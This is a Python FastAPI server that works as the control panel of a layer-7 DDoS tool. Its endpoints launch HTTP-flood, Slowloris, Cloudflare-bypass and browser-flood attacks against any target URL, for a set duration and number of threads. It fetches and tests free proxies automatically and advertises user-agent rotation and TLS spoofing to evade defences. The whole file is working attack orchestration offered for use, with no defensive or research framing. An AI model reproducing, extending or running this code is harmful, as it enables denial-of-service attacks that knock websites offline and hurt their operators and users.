from fastapi import FastAPI, BackgroundTasks
from pydantic import BaseModel
import asyncio
from typing import Optional, List
from methods.http_flood import HTTPFlood
from methods.slowloris import Slowloris
from methods.bypass import CFBypass
from methods.browser import BrowserFlood
from methods.proxy_manager import ProxyManager

app = FastAPI(title="Layer 7 Auto-Proxy Control Panel")

proxy_manager = ProxyManager()
attack_status = {"running": False, "method": None, "sent": 0, "proxies": 0}

@app.on_event("startup")
async def startup_event():
    """Auto fetch proxies saat app start"""
    asyncio.create_task(init_proxies())
    asyncio.create_task(proxy_manager.auto_refresh(interval=600))

async def init_proxies():
    await proxy_manager.fetch_free_proxies()
    await proxy_manager.get_working_proxies(max_test=100)
    attack_status["proxies"] = len(proxy_manager.working_proxies)

class AttackConfig(BaseModel):
    target: str
    duration: int
    method: str
    threads: Optional[int] = 500
    rpc: Optional[int] = 64
    use_proxy: Optional[bool] = True

@app.get("/")
async def root():
    return {
        "status": "online",
        "version": "3.0-auto-proxy",
        "methods": ["HTTP-FLOOD", "SLOWLORIS", "CF-BYPASS", "BROWSER-FLOOD"],
        "features": ["auto-proxy-fetch", "proxy-testing", "ua-rotation", "tls-spoofing"],
        "current_attack": attack_status,
        "available_proxies": len(proxy_manager.working_proxies),
        "total_proxies": len(proxy_manager.proxies)
    }

@app.post("/attack")
async def launch_attack(config: AttackConfig, background_tasks: BackgroundTasks):
    if attack_status["running"]:
        return {"error": "Attack already running"}
    
    if config.use_proxy and not proxy_manager.working_proxies:
        return {"error": "No working proxies available, fetching now..."}
    
    background_tasks.add_task(execute_attack, config)
    return {
        "status": "launched",
        "target": config.target,
        "method": config.method,
        "duration": config.duration,
        "threads": config.threads,
        "proxy_enabled": config.use_proxy,
        "proxy_count": len(proxy_manager.working_proxies)
    }

@app.post("/stop")
async def stop_attack():
    attack_status["running"] = False
    return {"status": "stopped", "total_sent": attack_status["sent"]}

@app.get("/status")
async def get_status():
    return attack_status

@app.post("/refresh-proxies")
async def refresh_proxies():
    """Manual refresh proxy list"""
    await proxy_manager.fetch_free_proxies()
    working = await proxy_manager.get_working_proxies(max_test=100)
    attack_status["proxies"] = len(working)
    return {
        "total_fetched": len(proxy_manager.proxies),
        "working": len(working),
        "proxy_list": working[:10]
    }

async def execute_attack(config: AttackConfig):
    attack_status["running"] = True
    attack_status["method"] = config.method
    attack_status["sent"] = 0
    
    proxy_list = proxy_manager.working_proxies if config.use_proxy else None
    
    try:
        if config.method == "HTTP-FLOOD":
            attacker = HTTPFlood(
                config.target, 
                config.threads, 
                config.rpc,
                config.use_proxy,
                proxy_list,
                proxy_manager
            )
        elif config.method == "SLOWLORIS":
            attacker = Slowloris(config.target, config.threads)
        elif config.method == "CF-BYPASS":
            attacker = CFBypass(
                config.target, 
                config.threads,
                config.use_proxy,
                proxy_list,
                proxy_manager
            )
        elif config.method == "BROWSER-FLOOD":
            attacker = BrowserFlood(
                config.target, 
                config.threads,
                config.use_proxy,
                proxy_list,
                proxy_manager
            )
        else:
            return
        
        await attacker.run(config.duration)
        attack_status["sent"] = attacker.sent if hasattr(attacker, 'sent') else 0
        
    finally:
        attack_status["running"] = False

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)